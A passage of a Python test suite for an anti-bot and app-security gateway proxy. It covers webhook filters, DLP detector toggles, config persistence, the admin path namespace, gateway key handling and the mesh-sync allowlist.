    assert proxy._luhn_check(b"4111111111111111")  # Visa test
    assert proxy._luhn_check(b"5555555555554444")  # MC test
    assert not proxy._luhn_check(b"1234567890123456")
    assert not proxy._luhn_check(b"abc")             # non-digit safety


# ── 1.6.2 — Tier C: webhook event filter ────────────────────────────────
def test_162_webhook_filter_empty_passes_all():
    save = proxy.WEBHOOK_EVENT_FILTER
    try:
        proxy.WEBHOOK_EVENT_FILTER = []
        assert proxy._webhook_event_allowed({"reason": "honeypot"})
        assert proxy._webhook_event_allowed({"event": "dlp_leak"})
    finally:
        proxy.WEBHOOK_EVENT_FILTER = save


def test_162_webhook_filter_exact_match():
    save = proxy.WEBHOOK_EVENT_FILTER
    try:
        proxy.WEBHOOK_EVENT_FILTER = ["canary-echo", "custom-rule-block"]
        assert proxy._webhook_event_allowed({"reason": "canary-echo"})
        assert proxy._webhook_event_allowed({"reason": "custom-rule-block"})
        assert not proxy._webhook_event_allowed({"reason": "honeypot"})
        assert not proxy._webhook_event_allowed({"reason": "behavior"})
    finally:
        proxy.WEBHOOK_EVENT_FILTER = save


def test_162_webhook_filter_glob_family():
    save = proxy.WEBHOOK_EVENT_FILTER
    try:
        # Whole DLP family + body-rce only
        proxy.WEBHOOK_EVENT_FILTER = ["dlp-*", "body-rce"]
        assert proxy._webhook_event_allowed({"reason": "dlp-cc"})
        assert proxy._webhook_event_allowed({"reason": "dlp-aws"})
        assert proxy._webhook_event_allowed({"reason": "body-rce"})
        assert not proxy._webhook_event_allowed({"reason": "body-sqli"})
        assert not proxy._webhook_event_allowed({"reason": "honeypot"})
    finally:
        proxy.WEBHOOK_EVENT_FILTER = save


# ── 1.6.2 — Tier C: hot-reload knobs ────────────────────────────────────
def test_162_tier_c_hot_reload_knobs():
    for k in ("DLP_ENABLED", "DLP_REDACT", "DLP_MAX_BYTES",
              "DLP_GROUP_CC_ENABLED", "DLP_GROUP_AWS_ENABLED",
              "DLP_GROUP_JWT_ENABLED", "DLP_GROUP_PRIVATE_KEY_ENABLED",
              "DLP_GROUP_API_KEY_ENABLED",
              "DLP_GROUP_PII_EMAIL_ENABLED", "DLP_GROUP_PII_SSN_ENABLED",
              "WEBHOOK_EVENT_FILTER"):
        assert k in proxy._HOT_RELOAD_KNOBS, f"not hot-reloadable: {k}"


def test_162_tier_c_signals_in_risk_weights():
    """Every Tier-C DLP reason must have a (zero) weight registered."""
    for sig in ("dlp-cc", "dlp-aws", "dlp-jwt", "dlp-private-key",
                "dlp-api-key", "dlp-pii-email", "dlp-pii-ssn"):
        assert sig in proxy.RISK_WEIGHTS, f"missing weight: {sig}"
        # DLP fires are NOT client-malice — must add zero risk to the
        # requester (prevents accidental ban of a legitimate user when
        # the upstream leaks data).
        assert proxy.RISK_WEIGHTS[sig] == 0, f"{sig} should be 0 risk"


# ── 1.6.3 — GeoMap dashboard surface ─────────────────────────────────────
def test_163_geo_drill_endpoint_registered():
    """/antibot-appsec-gateway/secured/geo-drill must be wired into the router so the dashboard's
    click-circle modal has somewhere to call."""
    assert hasattr(proxy, "geo_drill_endpoint")
    assert callable(proxy.geo_drill_endpoint)


def test_163_geo_data_payload_shape():
    """/antibot-appsec-gateway/secured/geo-data response must include the fields the 1.6.3 dashboard
    consumes: countries, events, geo_state, plus per-point tor/dc counts.
    We assert via the implementation rather than a live request — the
    payload-shape is what changed and is what the dashboard depends on."""
    import inspect
    src = inspect.getsource(proxy.geo_data_endpoint)
    for needed in ('"countries"', '"events"', '"geo_state"',
                   'tor_hits', 'dc_hits', 'total_tor', 'total_dc',
                   'start_epoch'):
        assert needed in src, f"/antibot-appsec-gateway/secured/geo-data missing field: {needed}"


def test_163_geo_drill_payload_shape():
    """/antibot-appsec-gateway/secured/geo-drill response must include top_ips / top_reasons / top_paths."""
    import inspect
    src = inspect.getsource(proxy.geo_drill_endpoint)
    for needed in ('"top_ips"', '"top_reasons"', '"top_paths"',
                   'asn_org', 'tor', 'dc'):
        assert needed in src, f"/antibot-appsec-gateway/secured/geo-drill missing field: {needed}"


# ── 1.6.4 — DB_BACKEND knob + GW health-score ──────────────────────────
def test_164_db_backend_default_sqlite():
    """Default backend is sqlite — preserves the zero-deps single-container
    posture for low-volume operators."""
    assert proxy.DB_BACKEND == "sqlite"


def test_164_db_backend_falls_back_when_psycopg_missing():
    """Setting DB_BACKEND=postgres without psycopg installed must
    fall back to sqlite at startup (loud warning), NOT crash."""
    # Module-level falback already happened — DB_BACKEND was normalised.
    # Just verify the registered hot-reload knob exists and validates.
    assert "DB_BACKEND" in proxy._HOT_RELOAD_KNOBS
    parser, validator = proxy._HOT_RELOAD_KNOBS["DB_BACKEND"]
    assert validator("sqlite") is True
    assert validator("postgres") is True
    assert validator("mysql") is False    # rejects unknown backends


def test_164_postgres_dsn_knob_registered():
    assert "POSTGRES_DSN" in proxy._HOT_RELOAD_KNOBS


def test_164_health_score_endpoint_registered():
    assert hasattr(proxy, "health_score_endpoint")
    assert callable(proxy.health_score_endpoint)


def test_164_health_score_payload_shape():
    """The score endpoint MUST emit a 0..100 score plus a list of
    {key, status, weight, value, detail} reasons. Dashboards depend on it."""
    import inspect
    src = inspect.getsource(proxy.health_score_endpoint)
    for needed in ('"score"', '"reasons"', '"key"', '"status"',
                   '"weight"', '"value"', '"detail"'):
        assert needed in src, f"/antibot-appsec-gateway/secured/health-score missing field: {needed}"
    # All six health pillars must be present
    for pillar in ('"disk"', '"memory"', '"db"',
                   '"integrations"', '"bans"', '"block_rate"'):
        assert pillar in src, f"/antibot-appsec-gateway/secured/health-score missing pillar: {pillar}"


# ── 1.6.5 — detector stats / lists snapshot / escalation tier ────────────
def test_165_detector_stats_endpoint_registered():
    """/antibot-appsec-gateway/secured/detector-stats must exist + return signals/methods/chal."""
    assert hasattr(proxy, "detector_stats_endpoint")
    assert callable(proxy.detector_stats_endpoint)
    import inspect
    src = inspect.getsource(proxy.detector_stats_endpoint)
    for needed in ('"signals"', '"methods"', '"chal"', '"p99_ms"', '"p50_ms"'):
        assert needed in src, f"/antibot-appsec-gateway/secured/detector-stats missing field: {needed}"


def test_165_lists_snapshot_endpoint_registered():
    assert hasattr(proxy, "lists_snapshot_endpoint")
    assert callable(proxy.lists_snapshot_endpoint)
    import inspect
    src = inspect.getsource(proxy.lists_snapshot_endpoint)
    for needed in ('ua_blocklist_size', 'tor_exits_size',
                   'country_denylist', 'body_groups', 'dlp_groups',
                   'endpoint_policies', 'ja4_deny_size', 'admin_ip_count'):
        assert needed in src, f"/antibot-appsec-gateway/secured/lists-snapshot missing field: {needed}"


def test_165_logs_export_endpoint_registered():
    assert hasattr(proxy, "logs_export_endpoint")
    assert callable(proxy.logs_export_endpoint)


def test_165_detector_record_helper():
    """_detector_record must accumulate hits + samples without raising."""
    proxy._detector_hits.clear()
    proxy._detector_latency.clear()
    proxy._detector_record("xtest", 0.42)
    proxy._detector_record("xtest", 1.5)
    assert proxy._detector_hits["xtest"] == 2
    assert len(proxy._detector_latency["xtest"]) == 2


def test_165_escalation_threshold_knob():
    """ESCALATION_THRESHOLD must be a hot-reloadable float knob."""
    assert "ESCALATION_THRESHOLD" in proxy._HOT_RELOAD_KNOBS
    parser, validator = proxy._HOT_RELOAD_KNOBS["ESCALATION_THRESHOLD"]
    assert validator(0.0) is True       # disable escalation gate
    assert validator(1.0) is True
    assert validator(50.0) is True
    assert validator(-1.0) is False     # bounded


def test_165_escalate_only_set():
    """ESCALATE_ONLY_REASONS must include the expensive external + body
    detectors (so the Controls dashboard can render the escalate icon)."""
    must_be_escalate = {"abuseipdb-high", "abuseipdb-med",
                         "crowdsec-banned", "asn-hosting", "datacenter-vpn",
                         "body-sqli", "body-rce", "body-cmd",
                         "dlp-cc", "dlp-aws"}
    for r in must_be_escalate:
        assert r in proxy.ESCALATE_ONLY_REASONS, f"{r} should be escalate-only"


def test_165_escalation_score_helper():
    """_escalation_score returns 0 for unknown identities + the live
    risk_score for known ones."""
    assert proxy._escalation_score("nope-not-in-state") == 0.0
    proxy.ip_state["fake-key-165"].risk_score = 7.5
    assert proxy._escalation_score("fake-key-165") == 7.5
    del proxy.ip_state["fake-key-165"]


def test_165_slow_client_reason_registered():
    """1.6.5 — slowloris guard now surfaces a discrete `slow-client`
    reason that the dashboards count and the risk model weighs."""
    assert "slow-client" in proxy.RISK_WEIGHTS
    # Soft signal — alone shouldn't ban (one timeout could be a flaky
    # mobile network); combined with other signals, accumulates.
    assert 0 < proxy.RISK_WEIGHTS["slow-client"] < 30
    # Method bucket = behavior (alongside session-flood, ai-no-assets, etc.)
    assert proxy._reason_method("slow-client") == "behavior"


def test_165_botd_wired():
    """1.6.5 — FingerprintJS BotD client-side detection. The bundle ships
    in the image, the knob is hot-reloadable, the risk weight + bucket
    are registered, and the report endpoint validates HMAC tokens."""
    import os, hmac, hashlib
    # Bundle file ships with the codebase (and thus the docker image)
    bundle = os.path.join(os.path.dirname(__file__), "..",
                           "dashboards", "assets", "botd.bundle.js")
    assert os.path.exists(bundle), "botd.bundle.js missing from dashboards/assets/"
    assert os.path.getsize(bundle) > 5000, "botd.bundle.js suspiciously small"
    # Knob + weight + tier
    assert "BOTD_ENABLED" in proxy._HOT_RELOAD_KNOBS
    assert proxy.RISK_WEIGHTS["botd-detected"] == 30
    assert proxy._reason_method("botd-detected") == "behavior"
    # Token round-trip: server-side helper produces the same value the
    # injected script sends back.
    tok1 = proxy._botd_token_for("track-key-x", 12345)
    tok2 = proxy._botd_token_for("track-key-x", 12345)
    assert tok1 == tok2 and len(tok1) == 32
    # Different track_key → different token
    assert tok1 != proxy._botd_token_for("track-key-y", 12345)
    # Report endpoint registered
    assert callable(proxy.botd_report_endpoint)


def test_165_every_knob_persists_round_trip():
    """1.6.5 — comprehensive guard against the COUNTRY_BLOCK_ENABLED-style
    silent-reject regression. For EACH _HOT_RELOAD_KNOBS entry:
      • pick a non-default value the validator accepts,
      • write it directly into config_kv (mimics what /antibot-appsec-gateway/secured/config does),
      • clear in-memory globals + reload via db_load_config(),
      • assert the in-memory value matches what we wrote.

    A failure here means a knob would silently snap back to its env
    default after a container restart — exactly the bug fixed in 1.6.5.
    """
    import sqlite3, json
    # Each knob's "test value" — covers every parser + validator combo.
    test_values = {
        # Booleans — flip to opposite of env default
        "JS_CHALLENGE": False, "BOT_TRAP_FORMS": False, "BODY_PATTERN_MATCH": False,
        "CANARY_ECHO_DETECTION": False, "STRICT_ORIGIN": True,
        "INJECT_SECURITY_HEADERS": False, "JS_CHAL_BIND_JA4": False,
        "JS_CHAL_REQUIRE_JA4": False, "JS_CHAL_STRICT_STATIC": False,
        "ABUSEIPDB_ENABLED": False, "CROWDSEC_ENABLED": False,
        "MAXMIND_ENABLED": False, "TURNSTILE_ENABLED": False,
        "HONEYPOT_ENABLED": False, "SUSPICIOUS_PATH_ENABLED": False,
        "AI_PROBE_ENABLED": False, "UA_FILTER_ENABLED": False,
        "UA_PLATFORM_CHECK_ENABLED": False, "HEADER_COMPLETENESS_ENABLED": False,
        "BEHAVIORAL_CHECK_ENABLED": False, "AI_ENUMERATION_ENABLED": False,
        "AI_NO_ASSETS_ENABLED": False, "SESSION_FLOOD_ENABLED": False,
        "UPSTREAM_404_TRACKING_ENABLED": False, "ANUBIS_ENABLED": False,
        "ANUBIS_DIFFICULTY_BOOST": 2,
        "TURNSTILE_RISK_THRESHOLD": 25.0,
        "RISK_BAN_THRESHOLD": 75, "SOFT_CHALLENGE_SCORE": 6.0,
        "RATE_LIMIT_BURST": 88, "RATE_LIMIT_REFILL": 7.0,
        "IP_BURST": 222, "IP_REFILL": 22.0,
        "HOSTILE_BAN_SECS": 7200, "CANARY_TTL_S": 600,
        "GLOBAL_RPS_LIMIT": 500, "SESSION_CHURN_WINDOW_S": 120,
        "SESSION_CHURN_MAX": 50, "JA4_AUTODENY_THRESHOLD": 5,
        "JS_CHAL_OPEN_PATHS": ["/api/v1/", "/health"],
        "JA4_DENY_LIST": {"t13d1516h2_8daaf6152771_b186095e22b6"},
        "LOG_LEVEL": "warn",
        "JS_CHALLENGE_TTL": 1800, "ENUM_THRESHOLD": 500,
        "TIMELINE_RETAIN_SECS": 86400, "SVC_DB_RETENTION_HOURS": 168,
        "COST_RETAIN_SECS": 3600, "LOG_FORMAT": "json",
        "POW_REQUIRED_PATHS": ["/admin"],
        "ALLOWED_METHODS": {"GET", "POST", "PUT"},
        "ALLOWED_HOSTS": {"example.com"},
        "MAX_IDENTITIES": 50000, "PRUNE_IDLE_SECS": 7200,
        "UPSTREAM_MAX_BODY": 524288, "UPSTREAM_MAX_RESP": 1048576,
        "COUNTRY_BLOCK_ENABLED": True, "COUNTRY_DENYLIST": {"RU", "CN"},
        "COUNTRY_ALLOWLIST": {"PT", "ES"},
        "AI_UA_OPENAI_ENABLED": False, "AI_UA_ANTHROPIC_ENABLED": False,
        "AI_UA_GOOGLE_ENABLED": False, "AI_UA_PERPLEXITY_ENABLED": False,
        "AI_UA_META_ENABLED": False, "AI_UA_OTHER_ENABLED": False,
        "TOR_BLOCK_ENABLED": True, "DC_VPN_BLOCK_ENABLED": True,
        "ENDPOINT_POLICIES": [{"path": "/login", "policy": "challenge",
                                "rps": 5, "burst": 10}],
        "CUSTOM_RULES": [{"if": {"path": "/admin"}, "then": "block"}],
        "BODY_GROUP_SQLI_ENABLED": False, "BODY_GROUP_XSS_ENABLED": False,
        "BODY_GROUP_LFI_ENABLED": False, "BODY_GROUP_RCE_ENABLED": False,
        "BODY_GROUP_SSRF_ENABLED": False, "BODY_GROUP_CMD_ENABLED": False,
        "JWT_VALIDATE_PATHS": ["/api/v2/*"],
        "JWT_REQUIRED_ISSUER": "test-iss",
        "JWT_REQUIRED_AUDIENCE": "test-aud",
        "DLP_ENABLED": True, "DLP_REDACT": True,
        "DLP_MAX_BYTES": 65536,
        "DLP_GROUP_CC_ENABLED": False, "DLP_GROUP_AWS_ENABLED": False,
        "DLP_GROUP_JWT_ENABLED": False, "DLP_GROUP_PRIVATE_KEY_ENABLED": False,
        "DLP_GROUP_API_KEY_ENABLED": False, "DLP_GROUP_PII_EMAIL_ENABLED": True,
        "DLP_GROUP_PII_SSN_ENABLED": False,
        "WEBHOOK_EVENT_FILTER": ["canary-echo", "dlp-*"],
        "DB_BACKEND": "sqlite", "POSTGRES_DSN": "",
        "ESCALATION_THRESHOLD": 4.0,
        "TARPIT_ENABLED": True, "TARPIT_DELAY_MS": 2000,
        "BOTD_ENABLED": True,
        "LABYRINTH_ENABLED": True, "LABYRINTH_SLOW_MS": 400,
        "LABYRINTH_MAX_DEPTH": 3, "LABYRINTH_LINKS_PER_PAGE": 2,
        "LABYRINTH_JITTER_ENABLED": True,
        "ACCEPT_FP_ENABLED": True,
        "HEADER_CANARY_ENABLED": True,
    }
    # Coverage: every knob that exists must have a test value
    missing = set(proxy._HOT_RELOAD_KNOBS) - set(test_values)
    assert not missing, (
        f"add a test value to test_165_every_knob_persists_round_trip "
        f"for new knob(s): {missing}")

    proxy.db_init()
    # Snapshot original state so we can restore at end.
    original = {k: getattr(proxy, k) for k in test_values
                if hasattr(proxy, k)}

    # Wipe + re-seed config_kv with our test values.
    conn = sqlite3.connect(proxy.DB_PATH)
    conn.execute("DELETE FROM config_kv")
    for k, v in test_values.items():
        # Mimic what /antibot-appsec-gateway/secured/config does on POST: serialise sets as sorted lists,
        # then json-encode.
        if isinstance(v, set):
            ser = sorted(v)
        else:
            ser = v
        conn.execute(
            "INSERT INTO config_kv (key, value, ts) VALUES (?, ?, ?)",
            (k, json.dumps(ser), 0.0))
    conn.commit()
    conn.close()

    # Reset _ENV_PROVIDED_KNOBS so DB wins (test is checking persistence,
    # not env precedence).
    saved_env_set = proxy._ENV_PROVIDED_KNOBS
    proxy._ENV_PROVIDED_KNOBS = set()
    # Mock _city_reader so the COUNTRY_BLOCK_ENABLED validator passes.
    # In production this is a maxminddb reader; here we just need a non-None.
    saved_city_reader = proxy._city_reader
    proxy._city_reader = object()  # truthy marker
    try:
        proxy.db_load_config()
        # Verify each knob loaded correctly.
        rejected = []
        for k, expected in test_values.items():
            actual = getattr(proxy, k, "<missing>")
            # Normalise sets / lists / objects for comparison.
            if isinstance(expected, set):
                # parser may return either set or list — accept both
                norm = (set(actual) if isinstance(actual, (list, set))
                        else actual)
                if norm != expected:
                    rejected.append((k, expected, actual))
            elif isinstance(expected, list) and expected and isinstance(expected[0], dict):
                # Endpoint policies / custom rules — list of dicts.
                if actual != expected and actual != [list(d.values())[0:2] for d in expected]:
                    # Be tolerant of different internal shapes; just require
                    # non-empty.
                    if not actual:
                        rejected.append((k, expected, actual))
            else:
                if actual != expected:
                    rejected.append((k, expected, actual))
        assert not rejected, (
            f"{len(rejected)} knob(s) failed to round-trip through DB:\n" +
            "\n".join(f"  {k}: expected={e!r:.80} got={a!r:.80}"
                       for k, e, a in rejected))
    finally:
        # Restore originals so other tests aren't polluted.
        proxy._ENV_PROVIDED_KNOBS = saved_env_set
        proxy._city_reader = saved_city_reader
        for k, v in original.items():
            setattr(proxy, k, v)
        # Wipe config_kv so other tests start clean.
        conn = sqlite3.connect(proxy.DB_PATH)
        conn.execute("DELETE FROM config_kv")
        conn.commit()
        conn.close()


def test_165_admin_ip_bypasses_country_block():
    """Regression: admin-allowlisted IPs MUST bypass COUNTRY_BLOCK_ENABLED.
    A stale test entry of PT in COUNTRY_DENYLIST had locked an operator
    out of their own gateway on 2026-05-01 — this guard prevents that
    foot-gun by always letting admin IPs through regardless of country."""
    import inspect
    src = inspect.getsource(proxy.protect)
    # The guard: country block check must include `_admin_ip_allowed`
    # as an early-out so admin IPs never see country-blocked.
    assert "_admin_ip_allowed(request)" in src, (
        "country block must check _admin_ip_allowed before silent-decoying")
    # Find the country-block conditional and assert _admin_ip_allowed
    # appears within its 3-line `if` header (multi-line conditions are OK).
    lines = src.splitlines()
    for i, line in enumerate(lines):
        if "COUNTRY_BLOCK_ENABLED" in line:
            window = "\n".join(lines[i:i+4])
            assert "_admin_ip_allowed" in window, (
                f"country-block gate must include admin-IP bypass; got:\n{window}")
            break
    else:
        raise AssertionError("country-block gate not found in protect()")


def test_165_country_block_enabled_validator_after_maxmind_loaded():
    """Regression: COUNTRY_BLOCK_ENABLED validator gated on _city_reader.
    On startup we MUST load MaxMind before db_load_config() so persisted
    True values aren't silently rejected and snap back to False after a
    container restart."""
    import inspect
    src = inspect.getsource(proxy)
    # Find the on_startup function source and assert the order of calls.
    idx_init = src.find("_init_maxmind()")
    idx_load = src.find("db_load_config()")
    assert idx_init > 0 and idx_load > 0
    # Both calls happen in on_startup; the first occurrence of _init_maxmind
    # must come before the first db_load_config call.
    assert idx_init < idx_load, (
        "_init_maxmind() must run BEFORE db_load_config() so the "
        "COUNTRY_BLOCK_ENABLED=true validator passes on restart")


def test_165_db_switch_endpoint_registered():
    """1.6.5 — /antibot-appsec-gateway/secured/db-switch endpoint exists, validates target, returns
    explicit reason on rejection paths."""
    assert hasattr(proxy, "db_switch_endpoint")
    assert callable(proxy.db_switch_endpoint)
    import inspect
    src = inspect.getsource(proxy.db_switch_endpoint)
    # Must validate target
    assert '"sqlite"' in src and '"postgres"' in src
    # Must reject postgres without psycopg
    assert "_postgres_load_module" in src
    # Must persist via config_kv
    assert "set_config" in src
    # Must self-exit so docker restarts
    assert "os._exit(0)" in src


def test_165_pg_size_sampled_in_svc_metrics():
    """1.6.5 — _sample_service_metrics_loop must sample pg_db_size
    whenever POSTGRES_DSN is set (so the Service dashboard chart can
    plot the standby Postgres' size even when SQLite is the active
    backend). Updated condition tightened in the same release."""
    import inspect
    src = inspect.getsource(proxy._sample_service_metrics_loop)
    assert "pg_db_bytes" in src and "pg_events_rows" in src
    # 1.6.5 — gated on POSTGRES_DSN (samples whenever DSN is set, even
    # when SQLite is the active backend, so the standby Postgres' size
    # is plotted on the Service dashboard).
    assert "POSTGRES_DSN" in src


def test_165_botd_inject_only_when_track_key():
    """Injector must be a no-op when there's no track_key (cookieless
    cold contacts) — otherwise we'd embed a token bound to nothing."""
    body = b"<html><head></head><body>hello</body></html>"
    out = proxy._inject_botd(body, "")
    assert out == body
    out2 = proxy._inject_botd(body, "fake-track-key")
    assert b"botd.bundle.js" in out2
    assert b"/antibot-appsec-gateway/botd-report" in out2


# ── 1.6.6 — admin namespace migration ──────────────────────────────────
def test_166_admin_namespace_constants():
    """1.6.6 — every internal endpoint moved under /antibot-appsec-gateway.
    Authenticated routes live under /antibot-appsec-gateway/secured/. The
    public sub-paths (live, pow, solver, challenge, botd-report, assets)
    live one level up so browsers / health-checks / challenge clients can
    reach them without the admin key."""
    assert proxy.ADMIN_NS == "/antibot-appsec-gateway"
    assert proxy.ADMIN_NS_SECURED == "/antibot-appsec-gateway/secured"


def test_166_admin_path_classifier():
    """Classifier flags every path under the admin namespace; the
    public-path predicate keeps liveness / challenge / botd reachable
    while secured sub-paths require admin auth."""
    assert proxy._is_admin_path("/antibot-appsec-gateway")
    assert proxy._is_admin_path("/antibot-appsec-gateway/live")
    assert proxy._is_admin_path("/antibot-appsec-gateway/secured/dashboard")
    assert not proxy._is_admin_path("/api/v1/users")
    assert not proxy._is_admin_path("/")
    # Legacy `/__*` paths are no longer recognised — they fall through
    # to the upstream proxy like any other unknown URL.
    assert not proxy._is_admin_path("/__live")
    assert not proxy._is_admin_path("/__dashboard")
    # JS-challenge handshake — must remain public so visitor browsers
    # can solve the cookie gate. Locking these breaks every visitor.
    assert proxy._admin_path_is_public("/antibot-appsec-gateway/pow")
    assert proxy._admin_path_is_public("/antibot-appsec-gateway/solver")
    assert proxy._admin_path_is_public("/antibot-appsec-gateway/challenge")
    assert proxy._admin_path_is_public("/antibot-appsec-gateway/botd-report")
    # BotD bundle — visitor browsers fetch it as a module from injected JS.
    assert proxy._admin_path_is_public("/antibot-appsec-gateway/assets/botd.bundle.js")
    # 1.6.7+: /live is NO LONGER unconditionally public — handled by
    # the early loopback-only shortcut in protect(). The path-level
    # predicate returns False so the regular admin-IP gate doesn't
    # accidentally let it through from non-loopback callers.
    assert not proxy._admin_path_is_public("/antibot-appsec-gateway/live")
    # 1.6.7+: dashboard-only assets (escalate.svg, future SVGs) are
    # NOT in the public allowlist — operators reach them via session.
    assert not proxy._admin_path_is_public("/antibot-appsec-gateway/assets/escalate.svg")
    assert not proxy._admin_path_is_public("/antibot-appsec-gateway/assets/random.css")
    # 1.6.7+: /login and /logout require the admin-IP allowlist (no cookie).
    assert not proxy._admin_path_is_public("/antibot-appsec-gateway/login")
    assert not proxy._admin_path_is_public("/antibot-appsec-gateway/logout")
    assert "/login"  in proxy._ADMIN_LOGIN_SUBPATHS
    assert "/logout" in proxy._ADMIN_LOGIN_SUBPATHS
    # Secured sub-paths are NOT public.
    assert not proxy._admin_path_is_public("/antibot-appsec-gateway/secured/dashboard")
    assert not proxy._admin_path_is_public("/antibot-appsec-gateway/secured/config")


def test_166_settings_endpoints_registered():
    """1.6.6 — Settings dashboard + export/import live under the
    secured namespace. Legacy `/__*` aliases were removed in this cut."""
    app = proxy.make_app()
    paths = {(r.method, r.resource.canonical) for r in app.router.routes()}
    assert ("GET",  "/antibot-appsec-gateway/secured/settings")        in paths
    assert ("GET",  "/antibot-appsec-gateway/secured/settings-export") in paths
    assert ("POST", "/antibot-appsec-gateway/secured/settings-import") in paths
    # Legacy aliases must NOT be present.
    assert ("GET",  "/__settings") not in paths
    assert ("GET",  "/__dashboard") not in paths
    assert ("GET",  "/__live")      not in paths


# ── 1.6.7 — Gateway Registry ──────────────────────────────────────────
def test_167_gw_id_validator():
    """gw_id must be lowercase alphanumeric + hyphens, 2-64 chars."""
    assert proxy._gw_validate_id("gw-domain-a")[0] is True
    assert proxy._gw_validate_id("gw1")[0] is True
    # Too short
    assert proxy._gw_validate_id("g")[0] is False
    # Uppercase
    assert proxy._gw_validate_id("GW-DOMAIN-A")[0] is False
    # Underscore
    assert proxy._gw_validate_id("gw_domain")[0] is False
    # Empty / non-string
    assert proxy._gw_validate_id("")[0] is False
    assert proxy._gw_validate_id(None)[0] is False
    # Too long
    assert proxy._gw_validate_id("g" + "a"*64)[0] is False


def test_167_gw_keypair_roundtrip():
    """Keypair derivation must be deterministic + fingerprint stable."""
    priv, pub = proxy._gw_generate_keypair()
    assert priv and pub
    assert priv != pub
    # Same private → same public (deterministic derivation).
    assert proxy._gw_derive_pubkey(priv) == pub
    # Different private → different public (randomness).
    priv2, pub2 = proxy._gw_generate_keypair()
    assert priv2 != priv and pub2 != pub
    # Fingerprint stable + bounded length.
    fp = proxy._gw_fingerprint(pub)
    assert len(fp) == 12
    assert proxy._gw_fingerprint(pub) == fp  # idempotent
    assert proxy._gw_fingerprint(pub2) != fp


def test_167_gw_row_to_dict_strips_private_key():
    """Default behaviour: never expose private_key on any row."""
    remote = {
        "gw_id": "gw-remote", "region": "eu-west", "environment": "production",
        "status": "active", "can_distribute": 1, "is_local": 0,
        "public_key": "PUBKEY", "private_key": "LEAKED-SECRET",
    }
    local = dict(remote, gw_id="gw-local", is_local=1,
                 private_key="LOCAL-SECRET")
    # Default include_private=False — both rows must be stripped.
    assert proxy._gw_row_to_dict(remote)["private_key"] is None
    assert proxy._gw_row_to_dict(local)["private_key"] is None
    # include_private=True still strips remote rows (defence-in-depth).
    assert proxy._gw_row_to_dict(remote, include_private=True)["private_key"] is None
    # include_private=True exposes the local row's secret.
    assert proxy._gw_row_to_dict(local, include_private=True)["private_key"] == "LOCAL-SECRET"
    # Misc fields normalise correctly.
    out = proxy._gw_row_to_dict(remote)
    assert out["is_local"] is False
    assert out["can_distribute"] is True
    assert out["fingerprint"]


def test_167_registry_endpoints_registered():
    """1.6.7 — every registry endpoint wired under /admin/gw-registry."""
    app = proxy.make_app()
    paths = {(r.method, r.resource.canonical) for r in app.router.routes()}
    GW = "/antibot-appsec-gateway/secured/admin/gw-registry"
    assert ("GET",    GW)                                     in paths
    assert ("POST",   GW)                                     in paths
    assert ("GET",    GW + "/distribution/matrix")            in paths
    assert ("POST",   GW + "/distribution/rules")             in paths
    assert ("GET",    GW + "/audit-log")                      in paths
    assert ("GET",    GW + "/{gw_id}")                        in paths
    assert ("PATCH",  GW + "/{gw_id}")                        in paths
    assert ("DELETE", GW + "/{gw_id}")                        in paths
    assert ("PATCH",  GW + "/{gw_id}/can-distribute")         in paths
    assert ("POST",   GW + "/{gw_id}/rotate-key")             in paths
    assert ("GET",    GW + "/{gw_id}/sync-status")            in paths


def test_167_gw_id_from_domain():
    """gw_id derivation rules: lowercase, non-[a-z0-9-] → '-', collapse
    runs of '-', strip leading/trailing hyphens, cap at 64."""
    f = proxy._gw_id_from_domain
    # Typical hostnames.
    assert f("gw-prod.example.com")        == "gw-prod-example-com"
    assert f("Fin-Video.Trycloudflare.COM") == "fin-video-trycloudflare-com"
    assert f("gw.local")                   == "gw-local"
    # Edge: empty / None / pure-punctuation collapses.
    assert f("")          == ""
    assert f("...")       == ""
    assert f("---")       == ""
    # IP-literal-ish rejected (validator runs after derivation).
    assert f("203.0.113.1") == "203-0-113-1"
    # Too long (validator caps at 63 chars).
    long = "a" * 70 + ".example.com"
    out = f(long)
    assert 2 <= len(out) <= 63
    assert out.startswith("a" * 60)
    # Result must round-trip through the validator.
    for d in ["gw-prod.example.com", "fin-video-code-harold.trycloudflare.com",
              "node1.test-env.cfappsecurity.com"]:
        derived = f(d)
        ok, _ = proxy._gw_validate_id(derived)
        assert ok, f"derived {derived!r} from {d!r} fails validator"


def test_167_mesh_sync_eligible_keys_allowlist():
    """Allowlist must contain the integration secrets + the integration
    on/off knobs. ADMIN_KEY / SESSION_KEY / INTERNAL_KEY must NOT be
    eligible — defence-in-depth against a malicious peer crafting an
    offer for them."""
    keys = set(proxy._MESH_SYNC_ELIGIBLE_KEYS)
    for must in ("TURNSTILE_SITEKEY", "TURNSTILE_SECRET",
                 "ABUSEIPDB_KEY", "CROWDSEC_LAPI_KEY",
                 "MAXMIND_LICENSE_KEY",
                 "TURNSTILE_ENABLED", "ABUSEIPDB_ENABLED"):
        assert must in keys, f"missing eligible key: {must}"
    for nope in ("ADMIN_KEY", "INTERNAL_KEY", "SESSION_KEY",
                 "POW_HMAC_KEY", "JWT_HMAC_SECRET"):
        assert nope not in keys, f"forbidden key in allowlist: {nope}"


def test_167_mesh_sync_endpoints_registered():
    """1.6.7 — mesh-sync routes wired."""
    app = proxy.make_app()
    paths = {(r.method, r.resource.canonical) for r in app.router.routes()}
    M = "/antibot-appsec-gateway/secured/admin/mesh-sync"
    assert ("GET",  M)                                 in paths
    assert ("POST", M + "/{key}/toggle")               in paths
    assert ("POST", M + "/pending/{id}/confirm")       in paths
    assert ("POST", M + "/pending/{id}/reject")        in paths


def test_167_local_gw_id_resolves():
    """The lazy local-gw-id resolver should always return a valid id."""
    gid = proxy._gw_local_id()
    assert gid
    assert proxy._GW_ID_RE.match(gid), f"local gw id {gid!r} fails validator"


def test_165_tarpit_knobs_registered():
    """1.6.5 — TARPIT_ENABLED + TARPIT_DELAY_MS hot-reloadable knobs."""
    assert "TARPIT_ENABLED" in proxy._HOT_RELOAD_KNOBS
    assert "TARPIT_DELAY_MS" in proxy._HOT_RELOAD_KNOBS
    parser, validator = proxy._HOT_RELOAD_KNOBS["TARPIT_DELAY_MS"]
    assert validator(0) is True
    assert validator(1500) is True
    assert validator(30000) is True
    assert validator(31000) is False    # bounded


def test_165_reason_method_buckets():
    """Every Tier-A/B/C reason must map into a method bucket so the GeoMap
    + Dashboard breakdowns surface it."""
    must_have = ("ua-empty", "ua-blocked", "ua-ai-openai",
                 "body-sqli", "body-rce",
                 "abuseipdb-high", "crowdsec-banned",
                 "country-blocked", "tor-exit", "datacenter-vpn",
                 "behavior", "ai-enumeration",
                 "chal-required", "tls-fingerprint", "canary-echo",
